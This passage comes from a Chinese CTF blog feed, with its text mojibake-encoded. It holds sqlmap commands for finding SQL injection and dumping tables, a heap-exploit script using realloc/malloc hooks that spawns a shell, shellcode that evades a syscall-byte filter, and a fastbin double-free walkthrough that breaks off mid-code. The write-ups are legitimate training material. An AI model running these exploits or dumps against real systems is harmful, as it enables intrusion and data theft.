00ã€‚è™½ç„¶è¿™åªæ”¹äº†å‹ç¼©æ–‡ä»¶æ•°æ®åŒºï¼Œä½†è¿˜æ˜¯èƒ½å¤Ÿè§£å‹å‡ºæ¥ï¼ˆ7zipä¼šæŠ¥ä¸ªå¤´éƒ¨é”™è¯¯ï¼‰</p><p>ç†è®ºä¸Šè¿˜åº”è¯¥æ”¹å‹ç¼©æ–‡ä»¶ç›®å½•åŒºçš„æ˜¯å¦åŠ å¯†çš„æ ‡å¿—</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2023/11/15/ctf-web/sqlmap/"/>
    <url>/2023/11/15/ctf-web/sqlmap/</url>
    
    <content type="html"><![CDATA[<p>åˆ¤æ–­èƒ½å¦æ³¨å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ•°æ®åº“</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æŒ‡å®šæ•°æ®åº“çš„è¡¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs -D &lt;dbname&gt; -tables<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æŒ‡å®šè¡¨çš„åˆ—</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs -D &lt;dbname&gt; -T &lt;tablename&gt; -columns<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹åˆ—å†…å®¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs -D &lt;dbname&gt; -T &lt;tablename&gt; -C &lt;colname&gt; -dump<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>realloc hook</title>
    <link href="/2023/11/14/ctf-pwn/reallochook/"/>
    <url>/2023/11/14/ctf-pwn/reallochook/</url>
    
    <content type="html"><![CDATA[<p>one gadget æ¡ä»¶ä¸æ»¡è¶³ï¼Œéœ€è¦è°ƒæ•´æ ˆï¼Œè®©<code>rsp+xxx</code>ç­‰äºnullã€‚</p><p>åŸç†ï¼š</p><p>reallocçš„æ±‡ç¼–ä»£ç ï¼Œåœ¨è°ƒç”¨realloc_hookä¹‹å‰æ¯”mallocã€freeç­‰å¤šäº†pushæŒ‡ä»¤å’ŒsubæŠ¬æ ˆæ“ä½œ</p><p>realloc_hookåŒmalloc_hookç›¸é‚»ï¼Œä¸€æ¬¡æ€§ä¿®æ”¹ä¸¤ä¸ªï¼Œè¿˜å¯ä»¥ç”¨<code>malloc-0x23</code></p><p>æ“ä½œï¼š</p><ol><li><p>ä¿®æ”¹malloc_hookä¸ºreallocæ§åˆ¶æ ˆå¸§çš„åœ°å€</p></li><li><p>ä¿®æ”¹realloc_hookä¸ºonegadget</p></li></ol><h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p><a href="https://buuoj.cn/challenges#roarctf_2019_easy_pwn">https://buuoj.cn/challenges#roarctf_2019_easy_pwn</a></p><p>ä¸çŸ¥é“libcã€‚buuojåªè¯´äº†æ˜¯ubuntu16ï¼Œbuuojä¸Šä¸‹ä¸‹æ¥çš„libc-2.23.soå’Œæˆ‘æŠ„çš„é¢˜è§£çš„ä¸ä¸€æ ·ï¼ˆone gadgetå°±ä¸ä¸€è‡´ï¼‰ï¼Œç„¶åreallocåç§»å’‹æ¥çš„æˆ‘å°±ä¸çŸ¥é“äº†ã€‚ã€‚ã€‚mallochookçš„å€’æ˜¯å¯¹çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;./roar&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;, 25453)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">index, size, content</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendlineafter(<span class="hljs-string">&quot;content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#2</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span><br>write(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\xb1&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">2</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br>leak = u64(p.recvline()[:<span class="hljs-number">8</span>])<br><br>libc1 = leak - libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x68</span><br>malloc_hook = libc1 + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc1 + libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br><br>log.info(<span class="hljs-string">&quot;Leak is:        &quot;</span> + <span class="hljs-built_in">hex</span>(leak))<br>log.info(<span class="hljs-string">&quot;Free hook is:   &quot;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>log.info(<span class="hljs-string">&quot;Malloc hook is: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>log.info(<span class="hljs-string">&quot;Fake chunk is:  &quot;</span> + <span class="hljs-built_in">hex</span>(fake_chunk))<br>log.info(<span class="hljs-string">&quot;libc is:        &quot;</span> + <span class="hljs-built_in">hex</span>(libc1))<br><br><br>realloc=libc1 + <span class="hljs-number">0x846CD</span><br>log.info(<span class="hljs-string">&quot;realloc is      &quot;</span> + <span class="hljs-built_in">hex</span>(realloc))<br><br>one_gadget=libc1 +<span class="hljs-number">0xf02a4</span><br><br><br>create(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#4</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#5</span><br>create(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#6</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#7</span><br>write(<span class="hljs-number">3</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x91&#x27;</span>)<br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">5</span>)<br>create(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#5</span><br>write(<span class="hljs-number">5</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>create(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#6</span><br>create(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#8</span><br>write(<span class="hljs-number">8</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb</span>+p64(one_gadget)+p64(realloc))<br><br>create(<span class="hljs-number">0x18</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellcode trick</title>
    <link href="/2023/11/07/ctf-pwn/shellcode/"/>
    <url>/2023/11/07/ctf-pwn/shellcode/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//æ£€æŸ¥ä¸è®¸å‡ºç°syscallçš„å­—èŠ‚ï¼š </span><br><span class="hljs-keyword">if</span> ( *v11 == <span class="hljs-number">0x80CD</span> || *v11 == <span class="hljs-number">0x340F</span> || *v11 == <span class="hljs-number">0x50F</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed filter at byte %d!\n&quot;</span>, l);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>æŠŠpush <span class="hljs-number">0x50f</span>æ”¹æˆ push <span class="hljs-number">0x50e</span> ; inc qword ptr [rsp] <br>shellcode =  \<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0) */</span><br>    <span class="hljs-comment">/* push b&#x27;/bin///sh\x00&#x27; */</span><br>    push <span class="hljs-number">0x68</span><br>    mov rax, <span class="hljs-number">0x732f2f2f6e69622f</span><br>    push rax<br>    mov rdi, rsp<br>    <span class="hljs-comment">/* push argument array [&#x27;sh\x00&#x27;, &#x27;-p\x00&#x27;] */</span><br>    <span class="hljs-comment">/* push b&#x27;sh\x00-p\x00&#x27; */</span><br>    mov rax, <span class="hljs-number">0x101010101010101</span><br>    push rax<br>    mov rax, <span class="hljs-number">0x101010101010101</span> ^ <span class="hljs-number">0x702d006873</span><br>    xor [rsp], rax<br>    xor esi, esi <span class="hljs-comment">/* 0 */</span><br>    push rsi <span class="hljs-comment">/* null terminate */</span><br>    push <span class="hljs-number">0xb</span><br>    pop rsi<br>    add rsi, rsp<br>    push rsi <span class="hljs-comment">/* &#x27;-p\x00&#x27; */</span><br>    push <span class="hljs-number">0x10</span><br>    pop rsi<br>    add rsi, rsp<br>    push rsi <span class="hljs-comment">/* &#x27;sh\x00&#x27; */</span><br>    mov rsi, rsp<br>    xor edx, edx <span class="hljs-comment">/* 0 */</span><br>    <span class="hljs-comment">/* call execve() */</span><br>    push <span class="hljs-number">0x3b</span> <span class="hljs-comment">/* 0x3b */</span><br>    pop rax<br>    <span class="hljs-comment">//syscall</span><br>    push <span class="hljs-number">0x050e</span><br>    inc qword ptr [rsp]<br>    jmp rsp<br>    nop<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc hook</title>
    <link href="/2023/11/04/ctf-pwn/mallochook/"/>
    <url>/2023/11/04/ctf-pwn/mallochook/</url>
    
    <content type="html"><![CDATA[<h3 id="å…³äºä»€ä¹ˆæ—¶å€™æ˜¯0x58ï¼Œä»€ä¹ˆæ—¶å€™æ˜¯0x60"><a href="#å…³äºä»€ä¹ˆæ—¶å€™æ˜¯0x58ï¼Œä»€ä¹ˆæ—¶å€™æ˜¯0x60" class="headerlink" title="å…³äºä»€ä¹ˆæ—¶å€™æ˜¯0x58ï¼Œä»€ä¹ˆæ—¶å€™æ˜¯0x60"></a>å…³äºä»€ä¹ˆæ—¶å€™æ˜¯0x58ï¼Œä»€ä¹ˆæ—¶å€™æ˜¯0x60</h3><p>æ˜¯å› ä¸ºtcacheçš„é—®é¢˜ï¼Œä¹‹å‰ä¸€ç›´éƒ½ä¸çŸ¥é“ï¼ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x60</span> <span class="hljs-comment"># tcache</span><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x58</span> <span class="hljs-comment"># no tcache</span><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - offset <span class="hljs-comment"># other condition(not unsorted bin leak)</span><br>malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="malloc-hook-0x23"><a href="#malloc-hook-0x23" class="headerlink" title="malloc hook - 0x23"></a>malloc hook - 0x23</h3><p>åœ¨malloc hook - 0x23åˆ†é…fakechunkå¯ä»¥è¾¾æˆsize=0x70çš„æ£€æŸ¥ï¼Œå› ä¸ºè¿™ä¸ªåœ°å€ä¸Šsizeè¿™é‡Œæ˜¯0x7fï¼Œè€Œæ£€æŸ¥æœºåˆ¶ä¸ä¼šæ£€æŸ¥æ ‡å¿—ä½</p><blockquote><p>libc2.31ç‰ˆæœ¬ä¸­è¿™ä¸ªä½ç½®ä¸Šçš„æ•°æ®å·²ç»ä¸å†æ˜¯0x7f</p></blockquote><h3 id="0ctfbabyheap"><a href="#0ctfbabyheap" class="headerlink" title="0ctfbabyheap"></a>0ctfbabyheap</h3><p>é¦–å…ˆæŸ¥çœ‹ä¿æŠ¤ï¼Œå‘ç°å…¨å¼€</p><p><img src="/img/0ctfbabyheap/media/2e4d9896a3691192ef608f635d67cde1.png"></p><p>ç„¶åé¢˜ç›®é‡Œå‘Šè¯‰äº†æ˜¯2.23ç‰ˆæœ¬çš„libcï¼Œå…ˆç”¨patchelfæ¢ä¸€ä¸‹libcçš„ä½ç½®ã€‚</p><p><img src="/img/0ctfbabyheap/media/f4d73666de533ddaed7caef8222b2ccf.png"></p><p>ç„¶åæ‰“å¼€idaæŸ¥çœ‹æ¼æ´ç‚¹</p><p>å‘ç°é—®é¢˜å‡ºåœ¨fillå‡½æ•°é‡Œï¼Œå¤§å°æ˜¯ç”¨æˆ·è¾“å…¥çš„ï¼Œå¯ä»¥æº¢å‡º</p><p><img src="/img/0ctfbabyheap/media/e17462f8199dc6d45437fb7e604f6c4b.png"></p><p>æº¢å‡ºçš„ç»“æœæ˜¯å¯ä»¥æ§åˆ¶ä¸‹ä¸€ä¸ªchunkçš„prevszå’Œinuse bitï¼Œå°†ä¸‹ä¸€ä¸ªchunk freeä¹‹åå¯ä»¥åˆå¹¶å‰é¢çš„free chunkã€‚å¦‚æœè¢«åˆå¹¶çš„éƒ¨åˆ†é‡Œæœ‰å¯ä»¥uafçš„éƒ¨åˆ†ï¼Œå°±å¯ä»¥æ³„éœ²unsorted binçš„å¤´èŠ‚ç‚¹mainarena+88çš„åœ°å€ï¼Œç„¶åæ³„éœ²libcåŸºåœ°å€ã€‚</p><p>ç„¶åç”±äºå¯ä»¥ä¿®æ”¹å—çš„å¤§å°ï¼Œå¯ä»¥é€šè¿‡æŠŠchunkä»unsorted biné‡Œåˆ‡åˆ†æ‹¿å‡ºæ¥ï¼Œé€ æˆchunk overlappingï¼Œç„¶åå°±å¯ä»¥ç»•è¿‡é¢˜ç›®è‡ªå¸¦çš„æ£€æŸ¥ï¼Œå®æ–½fastbin attackçš„double freeï¼ˆé€šè¿‡freeä¸¤ä¸ªåºå·ä¸åŒï¼Œä½†æ˜¯å®é™…åœ°å€ç›¸åŒçš„chunkï¼‰ï¼Œç»“æœå°±æ˜¯å¯ä»¥å®ç°ä¼ªé€ chunkä¸­çš„ä»»æ„åœ°å€å†™ï¼Œç„¶åå°±å¯ä»¥æŠŠå‰é¢æ³„éœ²çš„libcä¸­çš„one_gadgetè¦†ç›–åˆ°malloc hookåœ°å€ä¸Šï¼Œç„¶åä¸‹ä¸€æ¬¡mallocçš„æ—¶å€™å°±ä¼šè°ƒç”¨execve(â€¦binshâ€¦)ã€‚</p><p>å…·ä½“è°ƒè¯•è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆmallocå‡ ä¸ªchunkè¿›å»ï¼Œç„¶åfreeæ‰å‰ä¸¤ä¸ª</p><p><img src="/img/0ctfbabyheap/media/d2c594003ca8f723af882a81bbbe1a68.png"></p><p>å¯ä»¥çœ‹åˆ°å¤§å°ä½0x100çš„chunkè¢«æ”¾åˆ°äº†unsrted biné‡Œï¼Œå¤§å°ä¸º0x80çš„æ”¾åœ¨äº†fastbiné‡Œ</p><p><img src="/img/0ctfbabyheap/media/4aa0984ec87d5b2721a1b63d3c0b0c35.png"></p><p>ç„¶åæŠŠ0x80çš„chunkå†åˆ†é…å‡ºæ¥ï¼Œè¿›è¡Œæº¢å‡ºåˆ°chunk 2</p><p><img src="/img/0ctfbabyheap/media/b9f09f039c80b6c859a240d87234f2ed.png"></p><p>å¯ä»¥çœ‹åˆ°ä¸‹ä¸€ä¸ªchunkè¢«æ”¹æˆäº†inuseä¸º0çš„çŠ¶æ€ï¼Œprevsizeè¢«ä¿®æ”¹æˆäº†0x180ï¼Œä¹Ÿå°±æ˜¯å‰é¢ä¸¤ä¸ªchunkåˆå¹¶èµ·æ¥çš„å¤§å°</p><p><img src="/img/0ctfbabyheap/media/85331735315afc1ca327cebb35515deb.png"></p><p>å¦‚æœè¿™æ—¶å€™freeæ‰chunk2ï¼Œä¼šæŠŠæœ€å¼€å¤´çš„chunkä»unsorted biné‡Œæ‹¿å‡ºæ¥ï¼Œä¸å…¶è¿›è¡Œåˆå¹¶ï¼Œç„¶ååˆå¹¶ä¹‹åçš„chunkä¸€èµ·è¢«æ”¾åœ¨unsorted biné‡Œã€‚ç”±äºåˆå¹¶çš„è¿‡ç¨‹æŠŠä¸­é—´çš„chunk 1ç»™åˆå¹¶è¿›å»äº†ï¼Œä½†æ˜¯å®ƒè¿˜æ˜¯è¢«åˆ†é…çš„çŠ¶æ€ï¼Œå°±å¯ä»¥è¿›è¡Œchunkå†…å®¹çš„è¾“å‡ºæ³„éœ²ã€‚</p><p><img src="/img/0ctfbabyheap/media/be30a52291628b8928b773d513e70516.png"></p><p><img src="/img/0ctfbabyheap/media/fde0bcc5e16b386bd5e757816bca0c8e.png"></p><p><img src="/img/0ctfbabyheap/media/35f83a6472e30559fbcaafe98ab0f101.png"></p><p>å½¢æˆäº†0x280è¿™ä¸ªå¤§çš„chunkä¸­åµŒå¥—ç€ä¸€ä¸ªå°çš„å¤„äºè¢«åˆ†é…çš„chunkçš„overlappingã€‚è€Œè¿™ä¸ªchunkå¤„äº0x280è¿™ä¸ªå¤§å—çš„0x100åç§»å¤„ï¼Œæƒ³è¦é€šè¿‡å®ƒæ‰“å°å‡ºæ¥fdå’Œbkè¦æŠŠè¿™ä¸ªunsorted binåˆ‡å‰²ä¸€ä¸‹ã€‚</p><p><img src="/img/0ctfbabyheap/media/ebc1e7f864fc9b1007afad94f5096a31.png"></p><p><img src="/img/0ctfbabyheap/media/21336897cb0da16774853f0e20bbefb0.png"></p><p>è¿™æ ·å°±æœ‰äº†ä¸¤ä¸ªå¤„äºå®Œå…¨ç›¸åŒåœ°å€ä¸Šçš„freeã€mallocçŠ¶æ€çš„chunkã€‚</p><p>ç„¶ådump mallocçŠ¶æ€çš„å—ï¼Œå°±ä¼šæŠŠfreeçŠ¶æ€çš„chunkçš„fd bkæ‰“å°å‡ºæ¥ï¼Œè€Œè¿™ä¸ªfd bkç”±äºunsorted biné‡Œåªæœ‰è¿™ä¸€ä¸ªchunkèŠ‚ç‚¹ï¼Œfd bkä¼šæŒ‡å‘malloc_stateç»“æ„ä½“é‡Œçš„unsorted binæ•°ç»„é¡¹ï¼Œå¯¹åº”main_arena+88çš„ä½ç½®ï¼Œæ ¹æ®è¿™ä¸ªä¾¿å®œå¯ä»¥ç¡®å®šlibcçš„åŸºåœ°å€ã€‚</p><p><img src="/img/0ctfbabyheap/media/3b3ade9638161cf21a58f60c6558832b.png"></p><p><img src="/img/0ctfbabyheap/media/4d12325def65c8eab07cc7712b394a95.png"></p><p>ç„¶åéœ€è¦è¿›è¡Œä¸€ä¸ªfast bin attackçš„double freeï¼Œå…·ä½“è¿‡ç¨‹ä¸ºï¼š</p><p>free chunk aï¼Œ free chunk bï¼Œfree chunk aï¼Œmalloc chunk aï¼Œ malloc chunk bï¼Œ edit chunk aï¼Œmalloc chunk aï¼Œmalloc ä»»æ„åœ°å€çš„chunkè¿›è¡Œeditã€‚</p><p>é¦–å…ˆï¼Œä¸è¿ç»­free aä¸¤æ¬¡çš„åŸå› æ˜¯ä¼šæœ‰æ£€æŸ¥æœºåˆ¶ï¼Œbinsä¼šæ£€æŸ¥å½“å‰é“¾è¡¨é¡¶éƒ¨çš„chunkçš„åœ°å€å’Œç°åœ¨freeçš„åœ°å€æ˜¯å¦ç›¸åŒï¼Œç›¸åŒä¼šè¢«è§†ä¸ºdouble freeï¼Œä½†å¦‚æœä¸­é—´freeäº†å…¶å®ƒchunkï¼Œåˆ™ä¼šç»•è¿‡è¿™ä¸ªæ£€æŸ¥ã€‚ç„¶åmalloc aä¹‹åç¼–è¾‘å®ƒçš„fdï¼Œä¸‹æ¬¡malloc çš„æ—¶å€™è‡ªå·±å†™å…¥çš„fdæŒ‡å‘çš„åœ°å€ä¼šè¢«è§†ä¸ºä¸€ä¸ªchunkï¼Œç„¶åmallocå‡ºæ¥å°±å¯ä»¥å¯¹å…¶è¿›è¡Œå†™å…¥ï¼Œå®Œæˆä»»æ„åœ°å€å†™ã€‚</p><p>ä¸Šè¿°æµç¨‹åœ¨è¿™é“é¢˜é‡Œçš„è¡¨è¿°ä¸ºï¼š</p><p><img src="/img/0ctfbabyheap/media/aa97c259cc69d78bd91e0337b0db3725.png"></p><p>è¢«å†™å…¥çš„åœ°æ–¹æ˜¯malloc hookï¼Œå¦‚æœmalloc æ—¶è¿™ä¸Šé¢çš„åœ°å€ä¸æ˜¯0ï¼Œå°±ä¼šæ‰§è¡Œmalloc hookæŒ‡å‘çš„å‡½æ•°ã€‚å‘è¿™ä¸ªåœ°å€å†™å…¥ä¸€æ®µgadgetçš„åœ°å€ã€‚</p><p>éœ€è¦è¯´æ˜çš„ç‚¹åœ¨äºone_gadgetå¾—åˆ°çš„è°ƒç”¨execve binshçš„ä»£ç </p><p><img src="/img/0ctfbabyheap/media/530dce4d01190360fdb9f3bcfb99a79c.png"></p><p>é€‰ç”¨çš„æ˜¯ç¬¬äºŒä¸ª0x4526aï¼ˆè¿™ä¸ªæˆ‘ä¸çŸ¥é“ä¸ºå•¥å¤§å®¶éƒ½ç”¨å®ƒï¼Œå…¶ä»–å‡ ä¸ªæ²¡è¯•è¿‡ï¼‰</p><p>ç„¶åé€šè¿‡fast bin attack å°±æ‰§è¡Œäº†execveï¼Œæ‹¿åˆ°shell</p><p>æµ‹è¯•ï¼š</p><p>åœ¨buuojä¸Šæ‰“å¼€è¿™é“é¢˜ï¼ŒéªŒè¯äº†ä¸€ä¸‹expç¡®å®æ˜¯å¯¹çš„ã€‚</p><p><img src="/img/0ctfbabyheap/media/cf295e9198a01c7f4e082b7ccd607e5a.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 